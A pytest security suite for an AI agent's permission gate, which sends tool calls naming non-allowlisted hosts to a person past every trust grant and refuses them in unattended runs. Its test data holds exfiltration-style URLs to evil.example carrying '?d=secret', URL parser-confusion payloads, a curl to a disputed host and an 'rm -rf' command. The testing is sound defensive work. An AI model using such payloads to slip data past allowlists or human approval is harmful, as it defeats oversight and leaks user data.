"""A tool call that names a host off the allowed hosts in its arguments is put to a person past
every grant, as a shell command naming one is, and an unattended run is refused it.

Every tool counts: the built-in agent's, an app's or an MCP server's, and an agent CLI's own. A
URL argument is read as the tool that receives it would read it, so a host two URL readers could
disagree on is a host the call does not name. A bare host under a key that names a place counts
too, and so does a URL past the reading's bounds. The built-in agent's ``web_fetch`` and
``web_extract`` reach the exact link the conversation was given unasked; nothing else does. Hosts
are reserved names (RFC 2606).
"""

from __future__ import annotations

import json
from unittest.mock import MagicMock

import pytest
from test_an_off_list_host_is_asked_past_every_grant import (
    _allow_hosts,
    _answer,
    _asked,
    _events,
    _quiet_sel,
    _shell_ask,
    _state,
)
from test_an_unattended_run_stays_inside_its_bounds import _result, _run, _Tools

from personalclaw import approval_grants, run_bounds, trust_mode
from personalclaw.dashboard.chat import run_chat
from personalclaw.dashboard.state import _ChatSession
from personalclaw.llm.base import EVENT_COMPLETE, EVENT_PERMISSION_REQUEST, LLMEvent
from personalclaw.web import fetch as web

pytestmark = pytest.mark.security

LISTED = "allowed.example"
UNLISTED = "evil.example"
CHAT = "chat-1-urls"
#: A link the owner gave the conversation.
GIVEN = f"https://{UNLISTED}/report?id=7"


@pytest.fixture(autouse=True)
def _a_temporary_folder_and_no_links(tmp_path, monkeypatch):
    folder = tmp_path / "tmp"
    folder.mkdir()
    monkeypatch.setattr("tempfile.tempdir", str(folder))
    monkeypatch.setattr(web, "_seen_by_session", {})
    _allow_hosts(LISTED)


def _key() -> str:
    from personalclaw.dashboard.chat_utils import _history_key_for

    return _history_key_for(_ChatSession(CHAT).key)


def _network(tool_input, *, title="mcp__tools__fetch", kind="", session_key="dashboard:x"):
    return run_bounds.argument_network(title, kind, tool_input, session_key=session_key)


# ── How an argument is read ──────────────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "value",
    [
        f"https://{UNLISTED}\\@{LISTED}/",  # Python reads the listed host, WHATWG the other
        f"https:{UNLISTED}/x",
        f"https:/{UNLISTED}/x",
        f"https:\\\\{UNLISTED}/x",
        f"https://{UNLISTED}%2E/x",
        f"https://{UNLISTED}\t/x",
    ],
)
def test_a_url_two_readers_could_take_to_different_hosts_is_not_read(value) -> None:
    assert _network({"url": value}) == ((), True)


@pytest.mark.parametrize("host", [UNLISTED, LISTED])
@pytest.mark.parametrize(
    "shape",
    [
        " https://{}/x",
        "https://{}/x ",
        "https://{}/a b",
        "https://{}/x\n",
        "https://{}\\@other.example/",
        "https:{}/x",
        "https:/{}/x",
        "//{}/a b",  # scheme-relative, as a tool resolving it against a base reads it
        "//{}/x\n",
        " //{}/x",
    ],
)
def test_a_url_with_whitespace_a_backslash_or_no_slashes_is_never_a_listed_host(shape, host):
    """Whichever reading is right, its host is unread: it asks, even for a host you listed."""
    assert _network({"url": shape.format(host)}) == ((), True)


def test_a_given_link_spelled_with_whitespace_is_not_the_link_you_gave() -> None:
    web.record_user_message_urls("dashboard:x", f"please read {GIVEN}")
    assert _network({"url": f" {GIVEN}"}, title="web_fetch") == ((), True)


@pytest.mark.parametrize(
    "args,expected",
    [
        ({"a": {"b": {"c": {"d": f"https://{UNLISTED}/"}}}}, ((UNLISTED,), False)),
        ({"a": {"b": {"c": {"url": f"https:{UNLISTED}/x"}}}}, ((), True)),
        ({"a": {"b": {"c": {"host": UNLISTED}}}}, ((UNLISTED,), False)),
        (
            {**{f"k{i}": "v" for i in range(64)}, "last": f"https://{UNLISTED}/"},
            ((UNLISTED,), False),
        ),
        ({**{f"k{i}": "v" for i in range(64)}, "last": f"https:{UNLISTED}/x"}, ((), True)),
    ],
    ids=["depth 4", "depth 4 slashless", "depth 4 bare host", "65th string", "65th slashless"],
)
def test_every_string_is_read_whatever_its_depth_or_place(args, expected) -> None:
    assert _network(args) == expected


def test_arguments_past_what_is_read_at_all_are_a_host_the_call_does_not_name() -> None:
    args = {f"k{i}": "v" for i in range(run_bounds._ARGUMENT_LIMIT + 1)}
    assert _network(args) == ((), True)


def test_a_given_link_past_the_first_strings_is_not_consented() -> None:
    web.record_user_message_urls("dashboard:x", f"please read {GIVEN}")
    args = {**{f"k{i}": "v" for i in range(run_bounds._ARGUMENT_STRINGS)}, "url": GIVEN}
    assert _network(args, title="web_fetch") == ((UNLISTED,), False)


@pytest.mark.parametrize(
    "value,expected",
    [
        (f"//{UNLISTED}/x", ((UNLISTED,), False)),
        (f"\\\\{UNLISTED}/x", ((), True)),
        (f"/\\{UNLISTED}/x", ((), True)),
        (f"\\/{UNLISTED}/x", ((), True)),
        (f"////{UNLISTED}/x", ((), True)),
    ],
)
def test_a_scheme_relative_value_is_a_url_under_any_key(value, expected) -> None:
    assert _network({"next": value}) == expected


@pytest.mark.parametrize(
    "title,kind,args",
    [
        ("Write main.go", "edit", {"content": "//go:build linux\n\npackage a"}),
        ("Write notes.ts", "edit", {"content": "//TODO: tidy\nexport {}"}),
        ("Edit x.c", "edit", {"new_string": "//nolint\nint x;"}),
    ],
)
def test_a_files_text_that_opens_with_a_comment_is_no_url(title, kind, args) -> None:
    """An agent CLI's own file write: `//` and a word, then more text, is a comment."""
    assert _network(json.dumps(args), title=title, kind=kind) == ((), False)


def test_an_argument_of_no_json_kind_that_may_hold_a_url_is_not_read() -> None:
    assert _network(f"https://{UNLISTED}/".encode()) == ((), True)
    assert _network(None) == ((), False)


def test_an_agent_clis_input_that_is_no_json_and_holds_a_url_is_not_read() -> None:
    text = f"fetch https://{UNLISTED}/ please"
    assert _network(text, title=f"Fetching {UNLISTED}", kind="fetch") == ((), True)


@pytest.mark.parametrize(
    "args,host",
    [
        ({"dsn": f"redis://db.{UNLISTED}:6379/0"}, f"db.{UNLISTED}"),
        ({"bucket": f"s3://data.{UNLISTED}/k"}, f"data.{UNLISTED}"),
        ({"repo": f"git+ssh://git@{UNLISTED}/r.git"}, UNLISTED),
        ({"endpoint": f"api.{UNLISTED}/v1?d=1"}, f"api.{UNLISTED}"),
        ({"host": UNLISTED, "port": 22}, UNLISTED),
        ({"serverAddress": "10.20.30.40"}, "10.20.30.40"),
        ({"urls": [f"https://{UNLISTED}/a", "https://allowed.example/b"]}, UNLISTED),
        ({"hosts": [UNLISTED]}, UNLISTED),
        ({"urls": [f"{UNLISTED}/x"]}, UNLISTED),
        ({"ip": "203.0.113.9"}, "203.0.113.9"),
        ({"serverIp": "203.0.113.9"}, "203.0.113.9"),
        ({"proxies": [f"p.{UNLISTED}:3128"]}, f"p.{UNLISTED}"),
        ({"ipAddresses": ["203.0.113.9"]}, "203.0.113.9"),
    ],
)
def test_any_scheme_and_a_bare_host_under_a_place_key_are_read(args, host) -> None:
    assert _network(args) == ((host,), False)


def test_a_bare_host_with_whitespace_under_a_place_key_is_not_read() -> None:
    assert _network({"url": f"{UNLISTED}/a b"}) == ((), True)


@pytest.mark.parametrize(
    "title,args",
    [
        ("mcp__notes__add", {"text": f"see https://{UNLISTED}/ for more"}),
        ("mcp__notes__add", {"address": "123 Main Street"}),
        ("mcp__notes__add", {"server": "prod"}),
        ("mcp__notes__add", {"server": "cafe"}),
        ("mcp__notes__add", {"zip": "12345"}),
        ("mcp__media__cut", {"clip": "a.mp4"}),
        ("mcp__code__edit", {"new_string": "// TODO fix"}),
        ("mcp__build__run", {"target": "app.js"}),
        ("mcp__notes__add", {"link": "/docs/x"}),
        ("mcp__mail__draft", {"to": f"mailto:a@{UNLISTED}"}),
        ("write_file", {"path": "a.md", "content": f"https://{UNLISTED}/"}),
        ("mcp__tools__fetch", {"url": f"https://{LISTED}/x"}),
        ("mcp__tools__open", {"url": "file:///etc/hosts"}),
    ],
)
def test_what_names_no_unlisted_host_is_not_counted(title, args) -> None:
    assert _network(args, title=title) == ((), False)


# ── The conversation's own links ─────────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    "title,kind,url,consents",
    [
        ("web_fetch", "", GIVEN, True),
        ("web_extract", "", GIVEN + "#part", True),  # the fetch gate's own comparison form
        ("web_fetch", "", f"https://{UNLISTED}/report?id=8", False),
        ("web_fetch", "", f"https://{UNLISTED}/other", False),
        ("web_fetch", "", f"https://{UNLISTED}/report?id=7&d=secret", False),
        ("mcp__x__web_fetch", "", GIVEN, False),  # another tool of the same name's ending
        ("http_post", "", GIVEN, False),
        ("Fetching", "fetch", GIVEN, False),  # an agent CLI's own fetch tool
    ],
)
def test_only_the_built_in_fetch_reaches_the_exact_link_it_was_given(title, kind, url, consents):
    web.record_user_message_urls("dashboard:x", f"please read {GIVEN}")
    tool_input = {"url": url} if not kind else json.dumps({"url": url})
    expected = ((), False) if consents else ((UNLISTED,), False)
    assert _network(tool_input, title=title, kind=kind) == expected


@pytest.mark.parametrize(
    "kind,tool_input",
    [
        ("mcp", {"url": GIVEN}),  # another runtime's tool of the same name
        ("fetch", json.dumps({"url": GIVEN})),  # an agent CLI's tool of the same name
        ("", {"request": {"url": GIVEN}}),  # the link nested in another argument
        ("", {"link": GIVEN}),  # the link under another key
    ],
    ids=["an mcp tool", "an agent cli", "nested", "another key"],
)
def test_a_given_link_consents_only_as_the_built_in_fetchs_own_url(kind, tool_input) -> None:
    """A tool that takes the link with other arguments could carry data in them."""
    web.record_user_message_urls("dashboard:x", f"please read {GIVEN}")
    assert _network(tool_input, title="web_fetch", kind=kind) == ((UNLISTED,), False)


def test_with_no_session_no_link_was_given() -> None:
    web.record_user_message_urls("dashboard:x", f"please read {GIVEN}")
    assert _network({"url": GIVEN}, title="web_fetch", session_key="") == ((UNLISTED,), False)


@pytest.mark.asyncio
async def test_the_fetch_itself_refuses_a_link_with_no_session() -> None:
    outcome = await web.web_fetch(GIVEN, session_key="")
    assert not outcome.ok
    assert outcome.error == web._REFUSED


# ── The chat's gate ──────────────────────────────────────────────────────────────────────────────


def _native_ask(title: str, tool_input: dict, *, risk: str = "caution") -> LLMEvent:
    return LLMEvent(
        kind=EVENT_PERMISSION_REQUEST,
        title=title,
        risk_level=risk,
        tool_input=tool_input,
        request_id="req-1",
    )


def _cli_ask(url: str) -> LLMEvent:
    return LLMEvent(
        kind=EVENT_PERMISSION_REQUEST,
        title=f"Fetching {url}",
        tool_kind="fetch",
        tool_input=json.dumps({"url": url}),
        request_id="req-1",
    )


async def _chat_turn(tmp_path, ask: LLMEvent, *, answer: str | None, **posture):
    state, client = _state(tmp_path)
    session = _ChatSession(CHAT)
    for name, value in posture.items():
        setattr(session, name, value)
    client.stream = MagicMock(
        side_effect=lambda *a, **k: _events(
            [ask, LLMEvent(kind=EVENT_COMPLETE, stop_reason="end_turn")]
        )
    )
    answering = _answer(session, answer) if answer else None
    with _quiet_sel():
        await run_chat(state, session, "go")
    if answering is not None:
        await answering
    return session, client


@pytest.mark.asyncio
async def test_yolo_does_not_answer_a_fetch_of_a_link_the_model_built(tmp_path):
    trust_mode.enable_yolo(ttl_secs=600)
    session, client = await _chat_turn(
        tmp_path,
        _native_ask("web_fetch", {"url": f"https://{UNLISTED}/?d=secret"}),
        answer="rejected",
    )
    asked = _asked(session)
    assert len(asked) == 1, "YOLO answered a fetch of a host off the allowed hosts"
    assert UNLISTED in json.loads(asked[0]["cls"])["reach"]
    client.approve_tool.assert_not_called()


@pytest.mark.asyncio
async def test_yolo_still_answers_a_fetch_of_the_link_you_gave(tmp_path):
    trust_mode.enable_yolo(ttl_secs=600)
    web.record_user_message_urls(_key(), f"please read {GIVEN}")
    session, client = await _chat_turn(
        tmp_path, _native_ask("web_fetch", {"url": GIVEN}), answer=None
    )
    assert _asked(session) == []
    client.approve_tool.assert_called_once()


@pytest.mark.asyncio
@pytest.mark.parametrize("grant", ["Trust", "YOLO"])
async def test_no_grant_answers_an_agent_clis_own_fetch_of_an_unlisted_host(tmp_path, grant):
    posture = {"_trust": True} if grant == "Trust" else {}
    if grant == "YOLO":
        trust_mode.enable_yolo(ttl_secs=600)
    session, client = await _chat_turn(
        tmp_path, _cli_ask(f"https://{UNLISTED}/"), answer="rejected", **posture
    )
    assert len(_asked(session)) == 1
    client.approve_tool.assert_not_called()


@pytest.mark.asyncio
async def test_what_a_url_tool_declares_does_not_answer_it_either(tmp_path):
    """A tool labelled read-only (step 13) is answered by its label only inside the bounds."""
    trust_mode.enable_yolo(ttl_secs=600)
    ask = _native_ask("mcp__docs__read", {"url": f"https://{UNLISTED}/a"}, risk="safe")
    session, client = await _chat_turn(tmp_path, ask, answer="rejected")
    assert len(_asked(session)) == 1
    client.approve_tool.assert_not_called()


@pytest.mark.asyncio
@pytest.mark.parametrize("native", [True, False], ids=["the built-in agent", "an agent CLI"])
async def test_a_listed_host_is_answered_the_same_for_curl_and_a_fetch(tmp_path, native):
    trust_mode.enable_yolo(ttl_secs=600)
    curl = _shell_ask(f"curl -s https://{LISTED}/x", native=native)
    fetch = _native_ask("web_fetch", {"url": f"https://{LISTED}/x"}) if native else None
    for ask in (curl, fetch or _cli_ask(f"https://{LISTED}/x")):
        session, client = await _chat_turn(tmp_path, ask, answer=None)
        assert _asked(session) == []
        client.approve_tool.assert_called_once()


@pytest.mark.asyncio
@pytest.mark.parametrize("native", [True, False], ids=["the built-in agent", "an agent CLI"])
async def test_yolo_does_not_answer_curl_to_a_host_readers_disagree_on(tmp_path, native):
    """Python reads the listed host after the backslash; a browser or Node reads the other."""
    trust_mode.enable_yolo(ttl_secs=600)
    ask = _shell_ask(f"curl -s 'https://{UNLISTED}\\@{LISTED}/'", native=native)
    session, client = await _chat_turn(tmp_path, ask, answer="rejected")
    assert len(_asked(session)) == 1
    client.approve_tool.assert_not_called()


@pytest.mark.asyncio
async def test_an_unattended_chat_is_refused_a_url_tool_to_an_unlisted_host(tmp_path):
    session, client = await _chat_turn(
        tmp_path, _cli_ask(f"https://{UNLISTED}/"), answer=None, _trust=True, _unattended=True
    )
    assert _asked(session) == []
    client.approve_tool.assert_not_called()
    client.reject_tool.assert_called_once()


# ── The built-in agent's own check, and decide ───────────────────────────────────────────────────


class _WebTools(_Tools):
    async def list_tools(self):
        from personalclaw.tool_providers.base import RiskLevel, ToolDefinition

        return [
            *(await super().list_tools()),
            ToolDefinition(
                name="web_fetch",
                description="Fetch a page",
                parameters={"type": "object", "properties": {"url": {"type": "string"}}},
                risk_level=RiskLevel.CAUTION,
            ),
        ]


@pytest.mark.asyncio
async def test_an_unattended_built_in_agent_is_refused_a_fetch_of_an_unlisted_host(tmp_path):
    tools = _WebTools()
    events, invoked, _ = await _run(
        tmp_path, "web_fetch", {"url": f"https://{UNLISTED}/?d=1"}, unattended=True, tools=tools
    )
    assert invoked == []
    assert not any(e.kind == EVENT_PERMISSION_REQUEST for e in events)
    assert UNLISTED in (_result(events).tool_output or "")


@pytest.mark.asyncio
async def test_an_unattended_built_in_agent_still_fetches_the_link_it_was_given(tmp_path):
    web.record_user_message_urls("dashboard:loop-bounds", f"read {GIVEN}")
    events, invoked, _ = await _run(
        tmp_path, "web_fetch", {"url": GIVEN}, unattended=True, tools=_WebTools()
    )
    assert invoked == [("web_fetch", {"url": GIVEN})]


@pytest.mark.asyncio
async def test_an_attended_built_in_agent_asks_about_it_whatever_its_grant(tmp_path):
    events, invoked, _ = await _run(
        tmp_path, "web_fetch", {"url": f"https://{UNLISTED}/"}, unattended=False, tools=_WebTools()
    )
    assert any(e.kind == EVENT_PERMISSION_REQUEST for e in events)
    assert invoked == []


@pytest.mark.parametrize(
    "grant",
    [
        approval_grants.YOLO,
        approval_grants.TRUST,
        approval_grants.TRUST_READS,
        approval_grants.HOOK_PATTERN,
        approval_grants.LOOP_MODE,
    ],
)
def test_no_grant_stands_for_a_call_to_an_unlisted_host(tmp_path, grant) -> None:
    """Every grant a gate reads goes through ``stands_for_call``; none stands for this call."""
    event = _native_ask("web_fetch", {"url": f"https://{UNLISTED}/?d=1"})
    listed = _native_ask("web_fetch", {"url": f"https://{LISTED}/x"})
    kw = {"session_key": "dashboard:x", "cwd": str(tmp_path)}
    assert not approval_grants.stands_for_call(grant, event=event, **kw)
    assert approval_grants.stands_for_call(grant, event=listed, **kw), "the control stands"


# ── What a call declares (step 13) ───────────────────────────────────────────────────────────────


def _declared_event(command: str = "", *, url: str = "", risk: str = "destructive", **extra):
    if command:
        return LLMEvent(
            kind=EVENT_PERMISSION_REQUEST,
            title="bash",
            risk_level=risk,
            tool_input={"command": command},
            request_id="req-1",
            **extra,
        )
    return LLMEvent(
        kind=EVENT_PERMISSION_REQUEST,
        title="mcp__docs__read",
        risk_level=risk,
        tool_input={"url": url},
        request_id="req-1",
        **extra,
    )


@pytest.mark.parametrize(
    "declared", [{"risk": "safe"}, {"work_asks": True}], ids=["a declared read", "work that asks"]
)
@pytest.mark.parametrize("what", ["deletes its folder", "names an unlisted host"])
def test_what_a_call_declares_never_answers_a_call_put_to_a_person(tmp_path, declared, what):
    """What a call declares answers no call put to a person past every grant."""
    if what == "deletes its folder":
        event = _declared_event(f"rm -rf {tmp_path.resolve()}", **declared)
    else:
        event = _declared_event(url=f"https://{UNLISTED}/a", **declared)
    kw = {"session_key": "dashboard:x", "cwd": str(tmp_path.resolve())}
    assert approval_grants.declared_answer(event, **kw) == ""


@pytest.mark.parametrize(
    "event,answer",
    [
        (_declared_event("ls", risk="safe"), approval_grants.DECLARED_READ),
        (_declared_event(url=f"https://{LISTED}/a", risk="safe"), approval_grants.DECLARED_READ),
        (_declared_event(url=f"https://{LISTED}/a", work_asks=True), approval_grants.WORK_ASKS),
    ],
    ids=["a read command", "a read of a listed host", "work that asks, at a listed host"],
)
def test_a_declaration_inside_the_bounds_still_answers_as_declared(tmp_path, event, answer):
    kw = {"session_key": "dashboard:x", "cwd": str(tmp_path.resolve())}
    assert approval_grants.declared_answer(event, **kw) == answer
